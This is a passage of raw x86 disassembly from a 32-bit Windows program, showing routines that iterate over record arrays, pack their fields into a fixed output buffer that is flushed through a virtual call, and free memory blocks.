  403bd8:	mov    edi,DWORD PTR [eax+esi*4]
  403bdb:	test   edi,edi
  403bdd:	je     0x403bd0
  403bdf:	mov    eax,DWORD PTR [edi+0x4]
  403be2:	xor    edx,edx
  403be4:	mov    eax,DWORD PTR [eax]
  403be6:	div    ebx
  403be8:	mov    dl,0x1
  403bea:	mov    ecx,eax
  403bec:	and    ecx,0x7
  403bef:	shl    dl,cl
  403bf1:	shr    eax,0x3
  403bf4:	and    eax,0x7f
  403bf7:	or     BYTE PTR [ebp+eax*1-0x88],dl
  403bfe:	mov    edx,DWORD PTR [ebp-0x5a0]
  403c04:	jmp    0x403bc0
  403c06:	mov    eax,ds:0x414b24
  403c0b:	mov    ecx,0x20
  403c10:	lea    esi,[ebp-0x88]
  403c16:	lea    edi,[ebp-0x54f]
  403c1c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c1e:	lea    esi,[eax+0x99]
  403c24:	lea    ecx,[ebp-0x568]
  403c2a:	cmp    esi,0x416f28
  403c30:	jbe    0x403c3e
  403c32:	mov    edx,0x99
  403c37:	call   0x4045d0
  403c3c:	jmp    0x403c53
  403c3e:	push   0x99
  403c43:	push   ecx
  403c44:	push   eax
  403c45:	call   0x40db6c
  403c4a:	add    esp,0xc
  403c4d:	mov    DWORD PTR ds:0x414b24,esi
  403c53:	mov    eax,DWORD PTR [ebp-0x578]
  403c59:	mov    esi,DWORD PTR [ebp-0x570]
  403c5f:	dec    eax
  403c60:	push   eax
  403c61:	xor    edx,edx
  403c63:	mov    ecx,esi
  403c65:	call   0x406cb0
  403c6a:	mov    edx,DWORD PTR [ebp-0x578]
  403c70:	mov    ebx,DWORD PTR ds:0x414b1c
  403c76:	mov    eax,ds:0x414b24
  403c7b:	xor    edi,edi
  403c7d:	xor    ecx,ecx
  403c7f:	add    esp,0x4
  403c82:	mov    DWORD PTR [ebp-0x59c],0x0
  403c8c:	mov    DWORD PTR [ebp-0x598],0x0
  403c96:	mov    DWORD PTR [ebp-0x584],0x0
  403ca0:	mov    DWORD PTR [ebp-0x58c],0x0
  403caa:	mov    DWORD PTR [ebp-0x590],0x0
  403cb4:	mov    DWORD PTR [ebp-0x5a4],0x0
  403cbe:	mov    DWORD PTR [ebp-0x594],ebx
  403cc4:	mov    DWORD PTR [ebp-0x57c],edi
  403cca:	mov    DWORD PTR [ebp-0x56c],ecx
  403cd0:	test   edx,edx
  403cd2:	jle    0x403f08
  403cd8:	jmp    0x403ce0
  403cda:	lea    ebx,[ebx+0x0]
  403ce0:	cmp    BYTE PTR ds:0x40e42a,0x0
  403ce7:	jne    0x40450e
  403ced:	mov    edx,DWORD PTR [esi+ecx*8]
  403cf0:	mov    esi,DWORD PTR [edx+0x2]
  403cf3:	mov    WORD PTR [edx],cx
  403cf6:	mov    ecx,DWORD PTR [esi]
  403cf8:	mov    DWORD PTR [ebp-0x574],ecx
  403cfe:	mov    DWORD PTR [ebp-0x4c4],ecx
  403d04:	mov    cx,WORD PTR [esi+0x4]
  403d08:	mov    WORD PTR [ebp-0x4c0],cx
  403d0f:	mov    cl,BYTE PTR [esi+0x6]
  403d12:	mov    BYTE PTR [ebp-0x4be],cl
  403d18:	mov    ecx,DWORD PTR [edx+0xa]
  403d1b:	test   ecx,ecx
  403d1d:	je     0x403d23
  403d1f:	mov    ecx,DWORD PTR [ecx]
  403d21:	jmp    0x403d25
  403d23:	xor    ecx,ecx
  403d25:	add    DWORD PTR [ebp-0x59c],ecx
  403d2b:	mov    ecx,DWORD PTR [edx+0xe]
  403d2e:	test   ecx,ecx
  403d30:	je     0x403d36
  403d32:	mov    ecx,DWORD PTR [ecx]
  403d34:	jmp    0x403d38
  403d36:	xor    ecx,ecx
  403d38:	add    DWORD PTR [ebp-0x598],ecx
  403d3e:	mov    ecx,DWORD PTR [edx+0x12]
  403d41:	test   ecx,ecx
  403d43:	je     0x403d49
  403d45:	mov    ecx,DWORD PTR [ecx]
  403d47:	jmp    0x403d4b
  403d49:	xor    ecx,ecx
  403d4b:	add    DWORD PTR [ebp-0x584],ecx
  403d51:	mov    ecx,DWORD PTR [edx+0x16]
  403d54:	test   ecx,ecx
  403d56:	je     0x403d5c
  403d58:	mov    ecx,DWORD PTR [ecx]
  403d5a:	jmp    0x403d5e
  403d5c:	xor    ecx,ecx
  403d5e:	add    DWORD PTR [ebp-0x58c],ecx
  403d64:	mov    ecx,DWORD PTR [edx+0x6]
  403d67:	test   ecx,ecx
  403d69:	je     0x403da8
  403d6b:	mov    edx,DWORD PTR [ecx]
  403d6d:	test   edx,edx
  403d6f:	je     0x403d75
  403d71:	mov    edx,DWORD PTR [edx]
  403d73:	jmp    0x403d77
  403d75:	xor    edx,edx
  403d77:	mov    ecx,DWORD PTR [ecx+0x4]
  403d7a:	add    DWORD PTR [ebp-0x590],edx
  403d80:	test   ecx,ecx
  403d82:	je     0x403d96
  403d84:	mov    edx,DWORD PTR [ebp-0x5a4]
  403d8a:	mov    ecx,DWORD PTR [ecx]
  403d8c:	add    edx,ecx
  403d8e:	mov    DWORD PTR [ebp-0x5a4],edx
  403d94:	jmp    0x403dae
  403d96:	mov    edx,DWORD PTR [ebp-0x5a4]
  403d9c:	xor    ecx,ecx
  403d9e:	add    edx,ecx
  403da0:	mov    DWORD PTR [ebp-0x5a4],edx
  403da6:	jmp    0x403dae
  403da8:	mov    edx,DWORD PTR [ebp-0x5a4]
  403dae:	mov    ecx,DWORD PTR [ebp-0x59c]
  403db4:	mov    WORD PTR [ebp-0x4bd],cx
  403dbb:	mov    ecx,DWORD PTR [ebp-0x598]
  403dc1:	mov    WORD PTR [ebp-0x4bb],cx
  403dc8:	mov    ecx,DWORD PTR [ebp-0x584]
  403dce:	mov    WORD PTR [ebp-0x4b9],cx
  403dd5:	mov    ecx,DWORD PTR [ebp-0x58c]
  403ddb:	mov    WORD PTR [ebp-0x4b3],dx
  403de2:	mov    WORD PTR [ebp-0x4b7],cx
  403de9:	mov    ecx,DWORD PTR [ebp-0x590]
  403def:	lea    edx,[eax+0x13]
  403df2:	mov    WORD PTR [ebp-0x4b5],cx
  403df9:	cmp    edx,0x416f28
  403dff:	jbe    0x403e18
  403e01:	mov    edx,0x13
  403e06:	lea    ecx,[ebp-0x4c4]
  403e0c:	call   0x4045d0
  403e11:	mov    eax,ds:0x414b24
  403e16:	jmp    0x403e56
  403e18:	mov    ecx,DWORD PTR [ebp-0x574]
  403e1e:	mov    DWORD PTR [eax],ecx
  403e20:	mov    ecx,DWORD PTR [ebp-0x4c0]
  403e26:	mov    DWORD PTR [eax+0x4],ecx
  403e29:	mov    ecx,DWORD PTR [ebp-0x4bc]
  403e2f:	mov    DWORD PTR [eax+0x8],ecx
  403e32:	mov    ecx,DWORD PTR [ebp-0x4b8]
  403e38:	mov    DWORD PTR [eax+0xc],ecx
  403e3b:	mov    cx,WORD PTR [ebp-0x4b4]
  403e42:	mov    WORD PTR [eax+0x10],cx
  403e46:	mov    cl,BYTE PTR [ebp-0x4b2]
  403e4c:	mov    BYTE PTR [eax+0x12],cl
  403e4f:	mov    eax,edx
  403e51:	mov    ds:0x414b24,eax
  403e56:	mov    ecx,DWORD PTR [esi+0x7]
  403e59:	test   ecx,ecx
  403e5b:	jne    0x403ed7
  403e5d:	cmp    esi,DWORD PTR ds:0x414b20
  403e63:	je     0x403ed7
  403e65:	test   ebx,ebx
  403e67:	je     0x403e8a
  403e69:	push   esi
  403e6a:	lea    edx,[ebp-0x594]
  403e70:	lea    ecx,[ebp-0x57c]
  403e76:	call   0x404660
  403e7b:	mov    ebx,DWORD PTR [ebp-0x594]
  403e81:	mov    edi,DWORD PTR [ebp-0x57c]
  403e87:	add    esp,0x4
  403e8a:	mov    ecx,DWORD PTR [esi]
  403e8c:	mov    BYTE PTR ds:0x40e023,0x0
  403e93:	call   0x405b80
  403e98:	movzx  eax,al
  403e9b:	cmp    DWORD PTR [eax*4+0x414b28],0x0
  403ea3:	jne    0x403eac
  403ea5:	mov    DWORD PTR [eax*4+0x414b28],esi
  403eac:	test   edi,edi
  403eae:	jne    0x403eb8
  403eb0:	mov    DWORD PTR ds:0x414b1c,esi
  403eb6:	jmp    0x403ebb
  403eb8:	mov    DWORD PTR [edi+0x7],esi
  403ebb:	mov    eax,ds:0x414b24
  403ec0:	mov    edi,esi
  403ec2:	mov    DWORD PTR [esi+0x7],ebx
  403ec5:	mov    DWORD PTR [ebp-0x57c],edi
  403ecb:	test   ebx,ebx
  403ecd:	jne    0x403ee7
  403ecf:	mov    DWORD PTR ds:0x414b20,esi
  403ed5:	jmp    0x403ee7
  403ed7:	mov    edi,esi
  403ed9:	mov    ebx,ecx
  403edb:	mov    DWORD PTR [ebp-0x57c],edi
  403ee1:	mov    DWORD PTR [ebp-0x594],ebx
  403ee7:	mov    ecx,DWORD PTR [ebp-0x56c]
  403eed:	mov    edx,DWORD PTR [ebp-0x578]
  403ef3:	mov    esi,DWORD PTR [ebp-0x570]
  403ef9:	inc    ecx
  403efa:	mov    DWORD PTR [ebp-0x56c],ecx
  403f00:	cmp    ecx,edx
  403f02:	jl     0x403ce0
  403f08:	xor    edi,edi
  403f0a:	test   edx,edx
  403f0c:	jle    0x403fcd
  403f12:	mov    ecx,DWORD PTR [esi+edi*8]
  403f15:	mov    ecx,DWORD PTR [ecx+0xa]
  403f18:	test   ecx,ecx
  403f1a:	je     0x403f20
  403f1c:	mov    esi,DWORD PTR [ecx]
  403f1e:	jmp    0x403f22
  403f20:	xor    esi,esi
  403f22:	shl    esi,0x2
  403f25:	lea    ebx,[ecx+0x4]
  403f28:	lea    ecx,[esi+eax*1]
  403f2b:	mov    DWORD PTR [ebp-0x574],ecx
  403f31:	cmp    ecx,0x416f28
  403f37:	jbe    0x403fa1
  403f39:	mov    ecx,DWORD PTR ds:0x416f28
  403f3f:	sub    eax,0x414f28
  403f44:	mov    edx,DWORD PTR [ecx]
  403f46:	push   eax
  403f47:	push   0x414f28
  403f4c:	call   DWORD PTR [edx+0x10]
  403f4f:	test   eax,eax
  403f51:	je     0x4044e0
  403f57:	mov    DWORD PTR ds:0x414b24,0x414f28
  403f61:	cmp    esi,0x2000
  403f67:	jl     0x403f85
  403f69:	mov    ecx,DWORD PTR ds:0x416f28
  403f6f:	push   esi
  403f70:	mov    eax,DWORD PTR [ecx]
  403f72:	push   ebx
  403f73:	call   DWORD PTR [eax+0x10]
  403f76:	test   eax,eax
  403f78:	je     0x4044e0
  403f7e:	mov    eax,ds:0x414b24
  403f83:	jmp    0x403fb7
  403f85:	test   esi,esi
  403f87:	js     0x404500
  403f8d:	push   esi
  403f8e:	push   ebx
  403f8f:	push   0x414f28
  403f94:	call   0x40db6c
  403f99:	lea    eax,[esi+0x414f28]
  403f9f:	jmp    0x403faf
  403fa1:	push   esi
  403fa2:	push   ebx
  403fa3:	push   eax
  403fa4:	call   0x40db6c
  403fa9:	mov    eax,DWORD PTR [ebp-0x574]
  403faf:	mov    ds:0x414b24,eax
  403fb4:	add    esp,0xc
  403fb7:	mov    edx,DWORD PTR [ebp-0x578]
  403fbd:	inc    edi
  403fbe:	cmp    edi,edx
  403fc0:	jge    0x403fcd
  403fc2:	mov    esi,DWORD PTR [ebp-0x570]
  403fc8:	jmp    0x403f12
  403fcd:	cmp    BYTE PTR ds:0x40e42a,0x0
  403fd4:	jne    0x40450e
  403fda:	xor    edi,edi
  403fdc:	test   edx,edx
  403fde:	jle    0x4040ab
  403fe4:	mov    ecx,DWORD PTR [ebp-0x570]
  403fea:	mov    ecx,DWORD PTR [ecx+edi*8]
  403fed:	mov    ecx,DWORD PTR [ecx+0xe]
  403ff0:	test   ecx,ecx
  403ff2:	je     0x403ff8
  403ff4:	mov    esi,DWORD PTR [ecx]
  403ff6:	jmp    0x403ffa
  403ff8:	xor    esi,esi
  403ffa:	shl    esi,0x2
  403ffd:	lea    ebx,[ecx+0x4]
  404000:	lea    ecx,[esi+eax*1]
  404003:	mov    DWORD PTR [ebp-0x574],ecx
  404009:	cmp    ecx,0x416f28
  40400f:	jbe    0x404079
  404011:	mov    ecx,DWORD PTR ds:0x416f28
  404017:	sub    eax,0x414f28
  40401c:	mov    edx,DWORD PTR [ecx]
  40401e:	push   eax
  40401f:	push   0x414f28
  404024:	call   DWORD PTR [edx+0x10]
  404027:	test   eax,eax
  404029:	je     0x4044e0
  40402f:	mov    DWORD PTR ds:0x414b24,0x414f28
  404039:	cmp    esi,0x2000
  40403f:	jl     0x40405d
  404041:	mov    ecx,DWORD PTR ds:0x416f28
  404047:	push   esi
  404048:	mov    eax,DWORD PTR [ecx]
  40404a:	push   ebx
  40404b:	call   DWORD PTR [eax+0x10]
  40404e:	test   eax,eax
  404050:	je     0x4044e0
  404056:	mov    eax,ds:0x414b24
  40405b:	jmp    0x40408f
  40405d:	test   esi,esi
  40405f:	js     0x404500
  404065:	push   esi
  404066:	push   ebx
  404067:	push   0x414f28
  40406c:	call   0x40db6c
  404071:	lea    eax,[esi+0x414f28]
  404077:	jmp    0x404087
  404079:	push   esi
  40407a:	push   ebx
  40407b:	push   eax
  40407c:	call   0x40db6c
  404081:	mov    eax,DWORD PTR [ebp-0x574]
  404087:	mov    ds:0x414b24,eax
  40408c:	add    esp,0xc
  40408f:	mov    edx,DWORD PTR [ebp-0x578]
  404095:	inc    edi
  404096:	cmp    edi,edx
  404098:	jl     0x403fe4
  40409e:	cmp    BYTE PTR ds:0x40e42a,0x0
  4040a5:	jne    0x404513
  4040ab:	xor    ecx,ecx
  4040ad:	mov    DWORD PTR [ebp-0x56c],ecx
  4040b3:	test   edx,edx
  4040b5:	jle    0x404181
  4040bb:	jmp    0x4040c0
  4040bd:	lea    ecx,[ecx+0x0]
  4040c0:	mov    ebx,DWORD PTR [ebp-0x570]
  4040c6:	mov    ecx,DWORD PTR [ebx+ecx*8]
  4040c9:	mov    DWORD PTR [ebp-0x574],ecx
  4040cf:	mov    ebx,DWORD PTR [ecx+0x12]
  4040d2:	test   ebx,ebx
  4040d4:	je     0x4040da
  4040d6:	mov    ebx,DWORD PTR [ebx]
  4040d8:	jmp    0x4040dc
  4040da:	xor    ebx,ebx
  4040dc:	xor    esi,esi
  4040de:	test   ebx,ebx
  4040e0:	jle    0x40415f
  4040e2:	xor    edi,edi
  4040e4:	mov    edx,DWORD PTR [ecx+0x12]
  4040e7:	mov    ecx,DWORD PTR [edx+edi*1+0x4]
  4040eb:	movzx  ecx,WORD PTR [ecx]
  4040ee:	mov    WORD PTR [ebp-0x594],cx
  4040f5:	movzx  ecx,WORD PTR [edx+edi*1+0x8]
  4040fa:	lea    edx,[eax+0x4]
  4040fd:	mov    WORD PTR [ebp-0x592],cx
  404104:	cmp    edx,0x416f28
  40410a:	jbe    0x40413c
  40410c:	mov    ecx,DWORD PTR ds:0x416f28
  404112:	sub    eax,0x414f28
  404117:	mov    edx,DWORD PTR [ecx]
  404119:	push   eax
  40411a:	push   0x414f28
  40411f:	call   DWORD PTR [edx+0x10]
  404122:	test   eax,eax
  404124:	je     0x4044e0
  40412a:	mov    eax,DWORD PTR [ebp-0x594]
  404130:	mov    ds:0x414f28,eax
  404135:	mov    eax,0x414f2c
  40413a:	jmp    0x404146
  40413c:	mov    ecx,DWORD PTR [ebp-0x594]
  404142:	mov    DWORD PTR [eax],ecx
  404144:	mov    eax,edx
  404146:	mov    ecx,DWORD PTR [ebp-0x574]
  40414c:	inc    esi
  40414d:	add    edi,0x6
  404150:	mov    ds:0x414b24,eax
  404155:	cmp    esi,ebx
  404157:	jl     0x4040e4
  404159:	mov    edx,DWORD PTR [ebp-0x578]
  40415f:	mov    ecx,DWORD PTR [ebp-0x56c]
  404165:	inc    ecx
  404166:	mov    DWORD PTR [ebp-0x56c],ecx
  40416c:	cmp    ecx,edx
  40416e:	jl     0x4040c0
  404174:	cmp    BYTE PTR ds:0x40e42a,0x0
  40417b:	jne    0x404518
  404181:	xor    ecx,ecx
  404183:	mov    DWORD PTR [ebp-0x56c],ecx
  404189:	test   edx,edx
  40418b:	jle    0x404252
  404191:	mov    ebx,DWORD PTR [ebp-0x570]
  404197:	mov    ecx,DWORD PTR [ebx+ecx*8]
  40419a:	mov    DWORD PTR [ebp-0x574],ecx
  4041a0:	mov    ebx,DWORD PTR [ecx+0x16]
  4041a3:	test   ebx,ebx
  4041a5:	je     0x4041ab
  4041a7:	mov    ebx,DWORD PTR [ebx]
  4041a9:	jmp    0x4041ad
  4041ab:	xor    ebx,ebx
  4041ad:	xor    esi,esi
  4041af:	test   ebx,ebx
  4041b1:	jle    0x404230
  4041b3:	xor    edi,edi
  4041b5:	mov    edx,DWORD PTR [ecx+0x16]
  4041b8:	mov    ecx,DWORD PTR [edx+edi*1+0x4]
  4041bc:	movzx  ecx,WORD PTR [ecx]
  4041bf:	mov    WORD PTR [ebp-0x590],cx
  4041c6:	movzx  ecx,WORD PTR [edx+edi*1+0x8]
  4041cb:	lea    edx,[eax+0x4]
  4041ce:	mov    WORD PTR [ebp-0x58e],cx
  4041d5:	cmp    edx,0x416f28
  4041db:	jbe    0x40420d
  4041dd:	mov    ecx,DWORD PTR ds:0x416f28
  4041e3:	sub    eax,0x414f28
  4041e8:	mov    edx,DWORD PTR [ecx]
  4041ea:	push   eax
  4041eb:	push   0x414f28
  4041f0:	call   DWORD PTR [edx+0x10]
  4041f3:	test   eax,eax
  4041f5:	je     0x4044e0
  4041fb:	mov    eax,DWORD PTR [ebp-0x590]
  404201:	mov    ds:0x414f28,eax
  404206:	mov    eax,0x414f2c
  40420b:	jmp    0x404217
  40420d:	mov    ecx,DWORD PTR [ebp-0x590]
  404213:	mov    DWORD PTR [eax],ecx
  404215:	mov    eax,edx
  404217:	mov    ecx,DWORD PTR [ebp-0x574]
  40421d:	inc    esi
  40421e:	add    edi,0x6
  404221:	mov    ds:0x414b24,eax
  404226:	cmp    esi,ebx
  404228:	jl     0x4041b5
  40422a:	mov    edx,DWORD PTR [ebp-0x578]
  404230:	mov    ecx,DWORD PTR [ebp-0x56c]
  404236:	inc    ecx
  404237:	mov    DWORD PTR [ebp-0x56c],ecx
  40423d:	cmp    ecx,edx
  40423f:	jl     0x404191
  404245:	cmp    BYTE PTR ds:0x40e42a,0x0
  40424c:	jne    0x40451d
  404252:	xor    ecx,ecx
  404254:	mov    DWORD PTR [ebp-0x56c],ecx
  40425a:	test   edx,edx
  40425c:	jle    0x404364
  404262:	mov    ebx,DWORD PTR [ebp-0x570]
  404268:	jmp    0x404270
  40426a:	lea    ebx,[ebx+0x0]
  404270:	mov    ecx,DWORD PTR [ebx+ecx*8]
  404273:	mov    ecx,DWORD PTR [ecx+0x6]
  404276:	mov    DWORD PTR [ebp-0x574],ecx
  40427c:	test   ecx,ecx
  40427e:	je     0x404342
  404284:	mov    ebx,DWORD PTR [ecx]
  404286:	test   ebx,ebx
  404288:	je     0x40428e
  40428a:	mov    ebx,DWORD PTR [ebx]
  40428c:	jmp    0x404290
  40428e:	xor    ebx,ebx
  404290:	xor    esi,esi
  404292:	test   ebx,ebx
  404294:	jle    0x40433c
  40429a:	xor    edi,edi
  40429c:	lea    esp,[esp+0x0]
  4042a0:	mov    edx,DWORD PTR [ecx]
  4042a2:	mov    ecx,DWORD PTR [edx+edi*1+0x4]
  4042a6:	movzx  ecx,WORD PTR [ecx]
  4042a9:	mov    WORD PTR [ebp-0x58c],cx
  4042b0:	mov    cl,BYTE PTR [edx+edi*1+0x8]
  4042b4:	mov    BYTE PTR [ebp-0x58a],cl
  4042ba:	movzx  ecx,WORD PTR [edx+edi*1+0x9]
  4042bf:	lea    edx,[eax+0x5]
  4042c2:	mov    WORD PTR [ebp-0x589],cx
  4042c9:	cmp    edx,0x416f28
  4042cf:	jbe    0x40430c
  4042d1:	mov    ecx,DWORD PTR ds:0x416f28
  4042d7:	sub    eax,0x414f28
  4042dc:	mov    edx,DWORD PTR [ecx]
  4042de:	push   eax
  4042df:	push   0x414f28
  4042e4:	call   DWORD PTR [edx+0x10]
  4042e7:	test   eax,eax
  4042e9:	je     0x4044e0
  4042ef:	mov    eax,DWORD PTR [ebp-0x58c]
  4042f5:	mov    ds:0x414f28,eax
  4042fa:	mov    al,BYTE PTR [ebp-0x588]
  404300:	mov    ds:0x414f2c,al
  404305:	mov    eax,0x414f2d
  40430a:	jmp    0x40431f
  40430c:	mov    ecx,DWORD PTR [ebp-0x58c]
  404312:	mov    DWORD PTR [eax],ecx
  404314:	mov    cl,BYTE PTR [ebp-0x588]
  40431a:	mov    BYTE PTR [eax+0x4],cl
  40431d:	mov    eax,edx
  40431f:	mov    ecx,DWORD PTR [ebp-0x574]
  404325:	inc    esi
  404326:	add    edi,0x7
  404329:	mov    ds:0x414b24,eax
  40432e:	cmp    esi,ebx
  404330:	jl     0x4042a0
  404336:	mov    edx,DWORD PTR [ebp-0x578]
  40433c:	mov    ebx,DWORD PTR [ebp-0x570]
  404342:	mov    ecx,DWORD PTR [ebp-0x56c]
  404348:	inc    ecx
  404349:	mov    DWORD PTR [ebp-0x56c],ecx
  40434f:	cmp    ecx,edx
  404351:	jl     0x404270
  404357:	cmp    BYTE PTR ds:0x40e42a,0x0
  40435e:	jne    0x404522
  404364:	xor    ecx,ecx
  404366:	mov    DWORD PTR [ebp-0x56c],ecx
  40436c:	test   edx,edx
  40436e:	jle    0x404468
  404374:	mov    ebx,DWORD PTR [ebp-0x570]
  40437a:	lea    ebx,[ebx+0x0]
  404380:	mov    ecx,DWORD PTR [ebx+ecx*8]
  404383:	mov    ecx,DWORD PTR [ecx+0x6]
  404386:	mov    DWORD PTR [ebp-0x574],ecx
  40438c:	test   ecx,ecx
  40438e:	je     0x404453
  404394:	mov    ebx,DWORD PTR [ecx+0x4]
  404397:	test   ebx,ebx
  404399:	je     0x40439f
  40439b:	mov    ebx,DWORD PTR [ebx]
  40439d:	jmp    0x4043a1
  40439f:	xor    ebx,ebx
  4043a1:	xor    esi,esi
  4043a3:	test   ebx,ebx
  4043a5:	jle    0x40444d
  4043ab:	xor    edi,edi
  4043ad:	lea    ecx,[ecx+0x0]
  4043b0:	mov    edx,DWORD PTR [ecx+0x4]
  4043b3:	mov    ecx,DWORD PTR [edx+edi*1+0x4]
  4043b7:	movzx  ecx,WORD PTR [ecx]
  4043ba:	mov    WORD PTR [ebp-0x584],cx
  4043c1:	mov    cl,BYTE PTR [edx+edi*1+0x8]
  4043c5:	mov    BYTE PTR [ebp-0x582],cl
  4043cb:	movzx  ecx,WORD PTR [edx+edi*1+0x9]
  4043d0:	lea    edx,[eax+0x5]
  4043d3:	mov    WORD PTR [ebp-0x581],cx
  4043da:	cmp    edx,0x416f28
  4043e0:	jbe    0x40441d
  4043e2:	mov    ecx,DWORD PTR ds:0x416f28
  4043e8:	sub    eax,0x414f28
  4043ed:	mov    edx,DWORD PTR [ecx]
  4043ef:	push   eax
  4043f0:	push   0x414f28
  4043f5:	call   DWORD PTR [edx+0x10]
  4043f8:	test   eax,eax
  4043fa:	je     0x4044e0
  404400:	mov    eax,DWORD PTR [ebp-0x584]
  404406:	mov    ds:0x414f28,eax
  40440b:	mov    al,BYTE PTR [ebp-0x580]
  404411:	mov    ds:0x414f2c,al
  404416:	mov    eax,0x414f2d
  40441b:	jmp    0x404430
  40441d:	mov    ecx,DWORD PTR [ebp-0x584]
  404423:	mov    DWORD PTR [eax],ecx
  404425:	mov    cl,BYTE PTR [ebp-0x580]
  40442b:	mov    BYTE PTR [eax+0x4],cl
  40442e:	mov    eax,edx
  404430:	mov    ecx,DWORD PTR [ebp-0x574]
  404436:	inc    esi
  404437:	add    edi,0x7
  40443a:	mov    ds:0x414b24,eax
  40443f:	cmp    esi,ebx
  404441:	jl     0x4043b0
  404447:	mov    edx,DWORD PTR [ebp-0x578]
  40444d:	mov    ebx,DWORD PTR [ebp-0x570]
  404453:	mov    ecx,DWORD PTR [ebp-0x56c]
  404459:	inc    ecx
  40445a:	mov    DWORD PTR [ebp-0x56c],ecx
  404460:	cmp    ecx,edx
  404462:	jl     0x404380
  404468:	mov    ecx,DWORD PTR [ebp-0x5a0]
  40446e:	call   0x404540
  404473:	mov    eax,ds:0x414b24
  404478:	mov    ecx,DWORD PTR ds:0x416f28
  40447e:	sub    eax,0x414f28
  404483:	mov    edx,DWORD PTR [ecx]
  404485:	push   eax
  404486:	push   0x414f28
  40448b:	call   DWORD PTR [edx+0x10]
  40448e:	test   eax,eax
  404490:	je     0x404527
  404496:	mov    ecx,DWORD PTR [ebp-0x5a8]
  40449c:	mov    DWORD PTR ds:0x414b24,0x414f28
  4044a6:	mov    eax,DWORD PTR [ecx]
  4044a8:	call   DWORD PTR [eax+0x18]
  4044ab:	test   eax,eax
  4044ad:	je     0x40452c
  4044af:	push   DWORD PTR [ebp-0x570]
  4044b5:	call   DWORD PTR ds:0x42441c
  4044bb:	add    esp,0x4
  4044be:	mov    ecx,DWORD PTR [ebp-0x4]
  4044c1:	pop    edi
  4044c2:	pop    esi
  4044c3:	xor    ecx,ebp
  4044c5:	pop    ebx
  4044c6:	call   0x40d492
  4044cb:	mov    esp,ebp
  4044cd:	pop    ebp
  4044ce:	ret    
  4044cf:	push   0x0
  4044d1:	mov    edx,0x4010c0
  4044d6:	mov    ecx,0x5e5
  4044db:	call   0x407010
  4044e0:	call   0x4021b0
  4044e5:	call   0x4021b0
  4044ea:	call   0x4021b0
  4044ef:	push   0x0
  4044f1:	mov    edx,0x4010c0
  4044f6:	mov    ecx,0x5e5
  4044fb:	call   0x407010
  404500:	push   0x0
  404502:	xor    edx,edx
  404504:	mov    ecx,0x5dc
  404509:	call   0x407010
  40450e:	call   0x407400
  404513:	call   0x407400
  404518:	call   0x407400
  40451d:	call   0x407400
  404522:	call   0x407400
  404527:	call   0x4021b0
  40452c:	call   0x4021b0
  404531:	int3   
  404532:	int3   
  404533:	int3   
  404534:	int3   
  404535:	int3   
  404536:	int3   
  404537:	int3   
  404538:	int3   
  404539:	int3   
  40453a:	int3   
  40453b:	int3   
  40453c:	int3   
  40453d:	int3   
  40453e:	int3   
  40453f:	int3   
  404540:	push   ebx
  404541:	mov    ebx,DWORD PTR ds:0x4223e0
  404547:	push   esi
  404548:	lea    esi,[ecx+0x1e]
  40454b:	or     ecx,0xffffffff
  40454e:	push   edi
  40454f:	xor    edx,edx
  404551:	test   edx,edx
  404553:	je     0x40455b
  404555:	mov    edx,DWORD PTR [edx]
  404557:	test   edx,edx
  404559:	jne    0x40456e
  40455b:	mov    edi,DWORD PTR [esi+0x8]
  40455e:	mov    edi,edi
  404560:	inc    ecx
  404561:	cmp    ecx,edi
  404563:	jge    0x40457d
  404565:	mov    eax,DWORD PTR [esi]
  404567:	mov    edx,DWORD PTR [eax+ecx*4]
  40456a:	test   edx,edx
  40456c:	je     0x404560
  40456e:	mov    eax,DWORD PTR [edx+0x8]
  404571:	mov    DWORD PTR [eax],ebx
  404573:	mov    ebx,eax
  404575:	mov    DWORD PTR ds:0x4223e0,ebx
  40457b:	jmp    0x404551
  40457d:	mov    ecx,esi
  40457f:	call   0x406650
  404584:	mov    ecx,DWORD PTR [esi]
  404586:	test   ecx,ecx
  404588:	je     0x4045c1
  40458a:	mov    edx,DWORD PTR [esi+0x8]
  40458d:	shl    edx,0x2
  404590:	cmp    edx,0x200
  404596:	jl     0x4045a7
  404598:	call   0x40c970
  40459d:	mov    DWORD PTR [esi],0x0
  4045a3:	pop    edi
  4045a4:	pop    esi
  4045a5:	pop    ebx
  4045a6:	ret    
  4045a7:	cmp    edx,0x4
  4045aa:	jae    0x4045b1
  4045ac:	mov    edx,0x4
  4045b1:	mov    eax,DWORD PTR [edx*4+0x422378]
  4045b8:	mov    DWORD PTR [ecx],eax
  4045ba:	mov    DWORD PTR [edx*4+0x422378],ecx
  4045c1:	pop    edi
  4045c2:	mov    DWORD PTR [esi],0x0
  4045c8:	pop    esi
  4045c9:	pop    ebx
  4045ca:	ret    
  4045cb:	int3   
  4045cc:	int3   
  4045cd:	int3   
  4045ce:	int3   
  4045cf:	int3   
  4045d0:	mov    eax,ds:0x414b24
  4045d5:	push   ebx
  4045d6:	push   esi
  4045d7:	push   edi
  4045d8:	mov    ebx,ecx
  4045da:	mov    ecx,DWORD PTR ds:0x416f28
  4045e0:	sub    eax,0x414f28
  4045e5:	mov    esi,DWORD PTR [ecx]
  4045e7:	push   eax
  4045e8:	push   0x414f28
  4045ed:	mov    edi,edx
  4045ef:	call   DWORD PTR [esi+0x10]
  4045f2:	test   eax,eax
  4045f4:	je     0x40463d
  4045f6:	mov    DWORD PTR ds:0x414b24,0x414f28
  404600:	cmp    edi,0x2000
  404606:	jl     0x40461b
  404608:	mov    ecx,DWORD PTR ds:0x416f28
  40460e:	push   edi
  40460f:	mov    eax,DWORD PTR [ecx]
  404611:	push   ebx
  404612:	call   DWORD PTR [eax+0x10]
  404615:	test   eax,eax
  404617:	jne    0x404639
  404619:	jmp    0x404642
  40461b:	test   edi,edi
  40461d:	js     0x404647
  40461f:	push   edi
  404620:	push   ebx
  404621:	push   0x414f28
  404626:	call   0x40db6c
  40462b:	lea    eax,[edi+0x414f28]
  404631:	add    esp,0xc
  404634:	mov    ds:0x414b24,eax
  404639:	pop    edi
  40463a:	pop    esi
  40463b:	pop    ebx
  40463c:	ret    
  40463d:	call   0x4021b0
  404642:	call   0x4021b0
  404647:	push   0x0
  404649:	xor    edx,edx
  40464b:	mov    ecx,0x5dc
  404650:	call   0x407010
  404655:	int3   
  404656:	int3   
  404657:	int3   
  404658:	int3   
  404659:	int3   
  40465a:	int3   
  40465b:	int3   
  40465c:	int3   
  40465d:	int3   
  40465e:	int3   
  40465f:	int3   
  404660:	push   ebp
  404661:	mov    ebp,esp
  404663:	mov    eax,0x1030
  404668:	call   0x40db40
  40466d:	mov    eax,ds:0x40e018
